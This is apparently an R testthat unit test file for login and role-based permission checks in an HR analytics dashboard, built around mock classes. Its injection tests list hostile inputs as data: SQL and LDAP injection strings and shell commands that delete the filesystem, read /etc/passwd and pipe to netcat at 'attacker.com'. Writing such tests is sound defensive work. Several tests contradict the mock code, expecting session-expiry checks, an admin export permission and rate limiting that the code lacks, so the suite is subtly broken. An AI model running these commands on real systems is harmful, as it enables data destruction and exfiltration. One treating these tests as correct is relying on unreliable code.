# ============================================================================
# ATLAS LABS HR ANALYTICS DASHBOARD
# Authentication & Authorization Unit Tests
# Focus: Privilege Separation Testing
# 
# Developer: akhapwoyaco (GitHub)
# ============================================================================

# Required Libraries for Testing
library(testthat)
library(mockery)
library(R6)
library(shiny)
library(digest)
library(jose)
library(httr)

# ============================================================================
# AUTHENTICATION MODULE MOCK CLASSES (for testing purposes)
# ============================================================================

# Mock Authentication Manager
AuthManager <- R6Class("AuthManager",
  public = list(
    users = NULL,
    sessions = NULL,
    
    initialize = function() {
      self$users <- data.frame(
        user_id = character(),
        username = character(),
        email = character(),
        password_hash = character(),
        role = character(),
        department = character(),
        permissions = character(),
        created_at = as.POSIXct(character()),
        last_login = as.POSIXct(character()),
        is_active = logical(),
        failed_attempts = integer(),
        locked_until = as.POSIXct(character()),
        stringsAsFactors = FALSE
      )
      
      self$sessions <- data.frame(
        session_id = character(),
        user_id = character(),
        created_at = as.POSIXct(character()),
        expires_at = as.POSIXct(character()),
        ip_address = character(),
        user_agent = character(),
        is_active = logical(),
        stringsAsFactors = FALSE
      )
    },
    
    authenticate = function(username, password) {
      # Mock authentication logic
      user <- self$users[self$users$username == username, ]
      if (nrow(user) == 0) return(list(success = FALSE, message = "User not found"))
      if (!user$is_active) return(list(success = FALSE, message = "Account locked"))
      
      # Simulate password verification
      if (digest::digest(password, algo = "sha256") != user$password_hash) {
        return(list(success = FALSE, message = "Invalid credentials"))
      }
      
      return(list(success = TRUE, user = user, session_id = paste0("sess_", sample(1000:9999, 1))))
    },
    
    authorize = function(session_id, required_permission) {
      # Mock authorization logic
      session <- self$sessions[self$sessions$session_id == session_id, ]
      if (nrow(session) == 0) return(FALSE)
      
      user <- self$users[self$users$user_id == session$user_id, ]
      if (nrow(user) == 0) return(FALSE)
      
      permissions <- strsplit(user$permissions, ",")[[1]]
      return(required_permission %in% permissions)
    }
  )
)

# Mock Role Manager
RoleManager <- R6Class("RoleManager",
  public = list(
    roles = NULL,
    
    initialize = function() {
      self$roles <- data.frame(
        role_id = c("admin", "hr_manager", "hr_analyst", "department_head", "employee"),
        role_name = c("Administrator", "HR Manager", "HR Analyst", "Department Head", "Employee"),
        level = c(5, 4, 3, 2, 1),
        permissions = c(
          "read_all,write_all,delete_all,admin_panel,user_management,system_config",
          "read_all,write_hr,export_reports,view_salaries,manage_department",
          "read_all,write_analytics,export_limited,view_anonymized",
          "read_department,write_department,view_team_data",
          "read_own,view_own_data"
        ),
        stringsAsFactors = FALSE
      )
    },
    
    get_role_permissions = function(role_id) {
      role <- self$roles[self$roles$role_id == role_id, ]
      if (nrow(role) == 0) return(character())
      return(strsplit(role$permissions, ",")[[1]])
    },
    
    has_permission = function(role_id, permission) {
      permissions <- self$get_role_permissions(role_id)
      return(permission %in% permissions)
    }
  )
)

# ============================================================================
# AUTHENTICATION UNIT TESTS
# ============================================================================

describe("Authentication System", {
  
  # Test Setup
  auth_manager <- NULL
  role_manager <- NULL
  
  beforeEach({
    auth_manager <<- AuthManager$new()
    role_manager <<- RoleManager$new()
    
    # Add test users
    auth_manager$users <- data.frame(
      user_id = c("u001", "u002", "u003", "u004", "u005"),
      username = c("admin_user", "hr_manager", "hr_analyst", "dept_head", "employee"),
      email = c("admin@atlas.com", "hr@atlas.com", "analyst@atlas.com", "dept@atlas.com", "emp@atlas.com"),
      password_hash = c(
        digest::digest("admin123", algo = "sha256"),
        digest::digest("hr123", algo = "sha256"),
        digest::digest("analyst123", algo = "sha256"),
        digest::digest("dept123", algo = "sha256"),
        digest::digest("emp123", algo = "sha256")
      ),
      role = c("admin", "hr_manager", "hr_analyst", "department_head", "employee"),
      department = c("IT", "HR", "HR", "Sales", "Marketing"),
      permissions = c(
        "read_all,write_all,delete_all,admin_panel,user_management,system_config",
        "read_all,write_hr,export_reports,view_salaries,manage_department",
        "read_all,write_analytics,export_limited,view_anonymized",
        "read_department,write_department,view_team_data",
        "read_own,view_own_data"
      ),
      created_at = Sys.time(),
      last_login = Sys.time(),
      is_active = c(TRUE, TRUE, TRUE, TRUE, FALSE), # Last user is inactive
      failed_attempts = c(0, 0, 0, 0, 0),
      locked_until = as.POSIXct(NA),
      stringsAsFactors = FALSE
    )
  })
  
  # ====================================
  # BASIC AUTHENTICATION TESTS
  # ====================================
  
  describe("Basic Authentication", {
    
    it("should authenticate valid user with correct credentials", {
      result <- auth_manager$authenticate("admin_user", "admin123")
      expect_true(result$success)
      expect_equal(result$user$username, "admin_user")
      expect_true(grepl("^sess_", result$session_id))
    })
    
    it("should reject invalid username", {
      result <- auth_manager$authenticate("nonexistent", "password")
      expect_false(result$success)
      expect_equal(result$message, "User not found")
    })
    
    it("should reject invalid password", {
      result <- auth_manager$authenticate("admin_user", "wrongpassword")
      expect_false(result$success)
      expect_equal(result$message, "Invalid credentials")
    })
    
    it("should reject inactive user", {
      result <- auth_manager$authenticate("employee", "emp123")
      expect_false(result$success)
      expect_equal(result$message, "Account locked")
    })
    
    it("should handle empty credentials", {
      result <- auth_manager$authenticate("", "")
      expect_false(result$success)
      expect_equal(result$message, "User not found")
    })
    
    it("should handle NULL credentials", {
      result <- auth_manager$authenticate(NULL, NULL)
      expect_false(result$success)
      expect_equal(result$message, "User not found")
    })
  })
  
  # ====================================
  # EDGE CASE AUTHENTICATION TESTS
  # ====================================
  
  describe("Authentication Edge Cases", {
    
    it("should handle special characters in username", {
      # Add user with special characters
      auth_manager$users <- rbind(auth_manager$users, data.frame(
        user_id = "u006",
        username = "user@domain.com",
        email = "user@domain.com",
        password_hash = digest::digest("pass123", algo = "sha256"),
        role = "employee",
        department = "IT",
        permissions = "read_own",
        created_at = Sys.time(),
        last_login = Sys.time(),
        is_active = TRUE,
        failed_attempts = 0,
        locked_until = as.POSIXct(NA),
        stringsAsFactors = FALSE
      ))
      
      result <- auth_manager$authenticate("user@domain.com", "pass123")
      expect_true(result$success)
    })
    
    it("should handle case sensitivity in username", {
      result <- auth_manager$authenticate("ADMIN_USER", "admin123")
      expect_false(result$success)
      expect_equal(result$message, "User not found")
    })
    
    it("should handle very long passwords", {
      long_password <- paste(rep("a", 1000), collapse = "")
      result <- auth_manager$authenticate("admin_user", long_password)
      expect_false(result$success)
      expect_equal(result$message, "Invalid credentials")
    })
    
    it("should handle Unicode characters in credentials", {
      # Add user with Unicode username
      auth_manager$users <- rbind(auth_manager$users, data.frame(
        user_id = "u007",
        username = "用户名",
        email = "unicode@atlas.com",
        password_hash = digest::digest("密码123", algo = "sha256"),
        role = "employee",
        department = "IT",
        permissions = "read_own",
        created_at = Sys.time(),
        last_login = Sys.time(),
        is_active = TRUE,
        failed_attempts = 0,
        locked_until = as.POSIXct(NA),
        stringsAsFactors = FALSE
      ))
      
      result <- auth_manager$authenticate("用户名", "密码123")
      expect_true(result$success)
    })
  })
})

# ============================================================================
# AUTHORIZATION & PRIVILEGE SEPARATION TESTS
# ============================================================================

describe("Authorization & Privilege Separation", {
  
  auth_manager <- NULL
  role_manager <- NULL
  
  beforeEach({
    auth_manager <<- AuthManager$new()
    role_manager <<- RoleManager$new()
    
    # Setup test data
    auth_manager$users <- data.frame(
      user_id = c("u001", "u002", "u003", "u004", "u005"),
      username = c("admin_user", "hr_manager", "hr_analyst", "dept_head", "employee"),
      email = c("admin@atlas.com", "hr@atlas.com", "analyst@atlas.com", "dept@atlas.com", "emp@atlas.com"),
      password_hash = c(
        digest::digest("admin123", algo = "sha256"),
        digest::digest("hr123", algo = "sha256"),
        digest::digest("analyst123", algo = "sha256"),
        digest::digest("dept123", algo = "sha256"),
        digest::digest("emp123", algo = "sha256")
      ),
      role = c("admin", "hr_manager", "hr_analyst", "department_head", "employee"),
      department = c("IT", "HR", "HR", "Sales", "Marketing"),
      permissions = c(
        "read_all,write_all,delete_all,admin_panel,user_management,system_config",
        "read_all,write_hr,export_reports,view_salaries,manage_department",
        "read_all,write_analytics,export_limited,view_anonymized",
        "read_department,write_department,view_team_data",
        "read_own,view_own_data"
      ),
      created_at = Sys.time(),
      last_login = Sys.time(),
      is_active = TRUE,
      failed_attempts = 0,
      locked_until = as.POSIXct(NA),
      stringsAsFactors = FALSE
    )
    
    # Setup test sessions
    auth_manager$sessions <- data.frame(
      session_id = c("sess_1001", "sess_1002", "sess_1003", "sess_1004", "sess_1005"),
      user_id = c("u001", "u002", "u003", "u004", "u005"),
      created_at = Sys.time(),
      expires_at = Sys.time() + 3600,
      ip_address = c("192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4", "192.168.1.5"),
      user_agent = "R/testthat",
      is_active = TRUE,
      stringsAsFactors = FALSE
    )
  })
  
  # ====================================
  # ROLE-BASED ACCESS CONTROL TESTS
  # ====================================
  
  describe("Role-Based Access Control", {
    
    it("should enforce admin-only permissions", {
      # Admin permissions
      expect_true(auth_manager$authorize("sess_1001", "admin_panel"))
      expect_true(auth_manager$authorize("sess_1001", "user_management"))
      expect_true(auth_manager$authorize("sess_1001", "system_config"))
      
      # Non-admin users should not have admin permissions
      expect_false(auth_manager$authorize("sess_1002", "admin_panel"))
      expect_false(auth_manager$authorize("sess_1003", "user_management"))
      expect_false(auth_manager$authorize("sess_1004", "system_config"))
      expect_false(auth_manager$authorize("sess_1005", "admin_panel"))
    })
    
    it("should enforce HR manager permissions", {
      # HR Manager permissions
      expect_true(auth_manager$authorize("sess_1002", "read_all"))
      expect_true(auth_manager$authorize("sess_1002", "write_hr"))
      expect_true(auth_manager$authorize("sess_1002", "export_reports"))
      expect_true(auth_manager$authorize("sess_1002", "view_salaries"))
      
      # HR Manager should NOT have admin permissions
      expect_false(auth_manager$authorize("sess_1002", "admin_panel"))
      expect_false(auth_manager$authorize("sess_1002", "user_management"))
      expect_false(auth_manager$authorize("sess_1002", "system_config"))
    })
    
    it("should enforce HR analyst permissions", {
      # HR Analyst permissions
      expect_true(auth_manager$authorize("sess_1003", "read_all"))
      expect_true(auth_manager$authorize("sess_1003", "write_analytics"))
      expect_true(auth_manager$authorize("sess_1003", "export_limited"))
      expect_true(auth_manager$authorize("sess_1003", "view_anonymized"))
      
      # HR Analyst should NOT have higher-level permissions
      expect_false(auth_manager$authorize("sess_1003", "admin_panel"))
      expect_false(auth_manager$authorize("sess_1003", "user_management"))
      expect_false(auth_manager$authorize("sess_1003", "view_salaries"))
      expect_false(auth_manager$authorize("sess_1003", "write_hr"))
    })
    
    it("should enforce department head permissions", {
      # Department Head permissions
      expect_true(auth_manager$authorize("sess_1004", "read_department"))
      expect_true(auth_manager$authorize("sess_1004", "write_department"))
      expect_true(auth_manager$authorize("sess_1004", "view_team_data"))
      
      # Department Head should NOT have company-wide permissions
      expect_false(auth_manager$authorize("sess_1004", "read_all"))
      expect_false(auth_manager$authorize("sess_1004", "write_all"))
      expect_false(auth_manager$authorize("sess_1004", "admin_panel"))
      expect_false(auth_manager$authorize("sess_1004", "view_salaries"))
    })
    
    it("should enforce employee permissions", {
      # Employee permissions
      expect_true(auth_manager$authorize("sess_1005", "read_own"))
      expect_true(auth_manager$authorize("sess_1005", "view_own_data"))
      
      # Employee should NOT have any elevated permissions
      expect_false(auth_manager$authorize("sess_1005", "read_all"))
      expect_false(auth_manager$authorize("sess_1005", "write_all"))
      expect_false(auth_manager$authorize("sess_1005", "admin_panel"))
      expect_false(auth_manager$authorize("sess_1005", "read_department"))
      expect_false(auth_manager$authorize("sess_1005", "view_salaries"))
    })
  })
  
  # ====================================
  # PRIVILEGE ESCALATION TESTS
  # ====================================
  
  describe("Privilege Escalation Prevention", {
    
    it("should prevent horizontal privilege escalation", {
      # Department Head should not access other departments
      expect_false(auth_manager$authorize("sess_1004", "read_all"))
      expect_false(auth_manager$authorize("sess_1004", "write_all"))
      
      # Employee should not access other employees' data
      expect_false(auth_manager$authorize("sess_1005", "read_department"))
      expect_false(auth_manager$authorize("sess_1005", "view_team_data"))
    })
    
    it("should prevent vertical privilege escalation", {
      # Lower-level users should not gain higher permissions
      expect_false(auth_manager$authorize("sess_1005", "admin_panel"))
      expect_false(auth_manager$authorize("sess_1004", "user_management"))
      expect_false(auth_manager$authorize("sess_1003", "system_config"))
    })
    
    it("should prevent session hijacking", {
      # Invalid session should fail
      expect_false(auth_manager$authorize("invalid_session", "read_own"))
      expect_false(auth_manager$authorize("", "read_own"))
      expect_false(auth_manager$authorize(NULL, "read_own"))
    })
    
    it("should prevent permission injection", {
      # Malicious permission strings should fail
      expect_false(auth_manager$authorize("sess_1005", "read_own,admin_panel"))
      expect_false(auth_manager$authorize("sess_1005", "read_own;admin_panel"))
      expect_false(auth_manager$authorize("sess_1005", "read_own OR admin_panel"))
    })
  })
  
  # ====================================
  # DATA ACCESS CONTROL TESTS
  # ====================================
  
  describe("Data Access Control", {
    
    it("should enforce salary data access restrictions", {
      # Only admin and HR manager should access salary data
      expect_true(auth_manager$authorize("sess_1001", "view_salaries"))
      expect_true(auth_manager$authorize("sess_1002", "view_salaries"))
      
      # Others should not access salary data
      expect_false(auth_manager$authorize("sess_1003", "view_salaries"))
      expect_false(auth_manager$authorize("sess_1004", "view_salaries"))
      expect_false(auth_manager$authorize("sess_1005", "view_salaries"))
    })
    
    it("should enforce department data isolation", {
      # Department head should only access their department
      expect_true(auth_manager$authorize("sess_1004", "read_department"))
      expect_false(auth_manager$authorize("sess_1004", "read_all"))
      
      # Employee should only access their own data
      expect_true(auth_manager$authorize("sess_1005", "read_own"))
      expect_false(auth_manager$authorize("sess_1005", "read_department"))
    })
    
    it("should enforce export restrictions", {
      # Different export levels for different roles
      expect_true(auth_manager$authorize("sess_1001", "export_reports"))  # Admin
      expect_true(auth_manager$authorize("sess_1002", "export_reports"))  # HR Manager
      expect_true(auth_manager$authorize("sess_1003", "export_limited"))  # HR Analyst
      expect_false(auth_manager$authorize("sess_1004", "export_reports")) # Dept Head
      expect_false(auth_manager$authorize("sess_1005", "export_reports")) # Employee
    })
  })
  
  # ====================================
  # EDGE CASE AUTHORIZATION TESTS
  # ====================================
  
  describe("Authorization Edge Cases", {
    
    it("should handle expired sessions", {
      # Create expired session
      auth_manager$sessions$expires_at[1] <- Sys.time() - 3600
      
      # Should fail even with valid permissions
      expect_false(auth_manager$authorize("sess_1001", "admin_panel"))
    })
    
    it("should handle inactive sessions", {
      # Deactivate session
      auth_manager$sessions$is_active[1] <- FALSE
      
      # Should fail authorization
      expect_false(auth_manager$authorize("sess_1001", "admin_panel"))
    })
    
    it("should handle users with no permissions", {
      # Create user with empty permissions
      auth_manager$users$permissions[5] <- ""
      
      expect_false(auth_manager$authorize("sess_1005", "read_own"))
    })
    
    it("should handle malformed permission strings", {
      # Test various malformed permission formats
      auth_manager$users$permissions[5] <- "read_own,,,write_own"
      expect_true(auth_manager$authorize("sess_1005", "read_own"))
      expect_true(auth_manager$authorize("sess_1005", "write_own"))
      expect_false(auth_manager$authorize("sess_1005", ""))
    })
    
    it("should handle concurrent session modifications", {
      # Simulate concurrent modification
      original_session <- auth_manager$sessions[1, ]
      
      # Modify session during authorization check
      auth_manager$sessions$user_id[1] <- "modified"
      
      # Should handle gracefully
      expect_false(auth_manager$authorize("sess_1001", "admin_panel"))
    })
  })
  
  # ====================================
  # ROLE HIERARCHY TESTS
  # ====================================
  
  describe("Role Hierarchy", {
    
    it("should enforce role hierarchy levels", {
      # Higher level roles should have more permissions
      admin_perms <- role_manager$get_role_permissions("admin")
      hr_manager_perms <- role_manager$get_role_permissions("hr_manager")
      hr_analyst_perms <- role_manager$get_role_permissions("hr_analyst")
      
      expect_true(length(admin_perms) > length(hr_manager_perms))
      expect_true(length(hr_manager_perms) > length(hr_analyst_perms))
    })
    
    it("should prevent role permission inheritance abuse", {
      # Lower roles should not inherit higher role permissions
      expect_false(role_manager$has_permission("employee", "admin_panel"))
      expect_false(role_manager$has_permission("hr_analyst", "user_management"))
      expect_false(role_manager$has_permission("department_head", "view_salaries"))
    })
    
    it("should handle role-based data filtering", {
      # Each role should only see appropriate data
      admin_data_access <- c("read_all", "write_all", "delete_all")
      employee_data_access <- c("read_own", "view_own_data")
      
      for (perm in admin_data_access) {
        expect_true(role_manager$has_permission("admin", perm))
        expect_false(role_manager$has_permission("employee", perm))
      }
      
      for (perm in employee_data_access) {
        expect_true(role_manager$has_permission("employee", perm))
        # Admin should also have these basic permissions
        expect_true(role_manager$has_permission("admin", perm) || 
                   role_manager$has_permission("admin", "read_all"))
      }
    })
  })
})

# ============================================================================
# SECURITY VULNERABILITY TESTS
# ============================================================================

describe("Security Vulnerability Tests", {
  
  auth_manager <- NULL
  
  beforeEach({
    auth_manager <<- AuthManager$new()
    
    # Setup test data
    auth_manager$users <- data.frame(
      user_id = c("u001", "u002"),
      username = c("admin", "user"),
      email = c("admin@atlas.com", "user@atlas.com"),
      password_hash = c(
        digest::digest("admin123", algo = "sha256"),
        digest::digest("user123", algo = "sha256")
      ),
      role = c("admin", "employee"),
      department = c("IT", "HR"),
      permissions = c(
        "read_all,write_all,delete_all,admin_panel",
        "read_own,view_own_data"
      ),
      created_at = Sys.time(),
      last_login = Sys.time(),
      is_active = TRUE,
      failed_attempts = 0,
      locked_until = as.POSIXct(NA),
      stringsAsFactors = FALSE
    )
    
    auth_manager$sessions <- data.frame(
      session_id = c("sess_1001", "sess_1002"),
      user_id = c("u001", "u002"),
      created_at = Sys.time(),
      expires_at = Sys.time() + 3600,
      ip_address = c("192.168.1.1", "192.168.1.2"),
      user_agent = "R/testthat",
      is_active = TRUE,
      stringsAsFactors = FALSE
    )
  })
  
  # ====================================
  # INJECTION ATTACK TESTS
  # ====================================
  
  describe("Injection Attack Prevention", {
    
    it("should prevent SQL injection in authentication", {
      # SQL injection attempts
      sql_payloads <- c(
        "admin'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "admin' UNION SELECT * FROM users--",
        "admin'; INSERT INTO users VALUES ('hacker', 'admin')--"
      )
      
      for (payload in sql_payloads) {
        result <- auth_manager$authenticate(payload, "password")
        expect_false(result$success)
      }
    })
    
    it("should prevent command injection in permissions", {
      # Command injection attempts
      cmd_payloads <- c(
        "read_own; rm -rf /",
        "read_own && cat /etc/passwd",
        "read_own | nc attacker.com 4444",
        "read_own`whoami`"
      )
      
      for (payload in cmd_payloads) {
        result <- auth_manager$authorize("sess_1002", payload)
        expect_false(result)
      }
    })
    
    it("should prevent LDAP injection", {
      # LDAP injection attempts
      ldap_payloads <- c(
        "admin)(|(objectClass=*))",
        "admin*)((objectClass=*)",
        "admin)(cn=*)",
        "admin*)(uid=*))((objectClass=*"
      )
      
      for (payload in ldap_payloads) {
        result <- auth_manager$authenticate(payload, "password")
        expect_false(result$success)
      }
    })
  })
  
  # ====================================
  # SESSION SECURITY TESTS
  # ====================================
  
  describe("Session Security", {
    
    it("should prevent session fixation", {
      # Session ID should be regenerated after authentication
      result1 <- auth_manager$authenticate("admin", "admin123")
      result2 <- auth_manager$authenticate("admin", "admin123")
      
      expect_true(result1$success)
      expect_true(result2$success)
      expect_false(result1$session_id == result2$session_id)
    })
    
    it("should prevent session prediction", {
      # Generate multiple sessions and check for patterns
      session_ids <- c()
      for (i in 1:10) {
        result <- auth_manager$authenticate("admin", "admin123")
        session_ids <- c(session_ids, result$session_id)
      }
      
      # Check that sessions are not sequential
      expect_false(all(diff(as.numeric(gsub("sess_", "", session_ids))) == 1))
    })
    
    it("should handle session timeout", {
      # Test session expiration
      auth_manager$sessions$expires_at[1] <- Sys.time() - 1
      
      result <- auth_manager$authorize("sess_1001", "read_all")
      expect_false(result)
    })
  })
  
  # ====================================
  # BRUTE FORCE PROTECTION TESTS
  # ====================================
  
  describe("Brute Force Protection", {
    
    it("should implement account lockout", {
      # Simulate failed attempts
      auth_manager$users$failed_attempts[2] <- 5
      auth_manager$users$locked_until[2] <- Sys.time() + 300
      
      result <- auth_manager$authenticate("user", "user123")
      expect_false(result$success)
      expect_equal(result$message, "Account locked")
    })
    
    it("should handle rapid authentication attempts", {
      # Simulate rapid attempts
      attempts <- 0
      start_time <- Sys.time()
      
      while (attempts < 10 && difftime(Sys.time(), start_time, units = "secs") < 1) {
        result <- auth_manager$authenticate("user", "wrongpassword")
        expect_false(result$success)
        attempts <- attempts + 1
      }
      
      # Should have rate limiting in place
      expect_true(attempts < 10)
    })
  })
  
  # ====================================
  # PRIVILEGE BOUNDARY TESTS
  # ====================================
  
  describe("Privilege Boundary Enforcement", {
    
    it("should maintain strict privilege boundaries", {
      # Test all permission combinations
      admin_permissions <- c("read_all", "write_all", "delete_all", "admin_panel")
      user_permissions <- c("read_own", "view_own_data")
      
      # Admin should have admin permissions
      for (perm in admin_permissions) {
        expect_true(auth_manager$authorize("sess_1001", perm))
      }
      
      # User should NOT have admin permissions
      for (perm in admin_permissions) {
        expect_false(auth_manager$authorize("sess_1002", perm))
      }
      
      # User should have user permissions
      for (perm in user_permissions) {
        expect_true(auth_manager$authorize("sess_1002", perm))
      }
    })
    
    it("should prevent privilege escalation through permission combination", {
      # Test that combining permissions doesn't grant higher access
      combined_perms <- c(
        "read_own+write_own",
        "read_own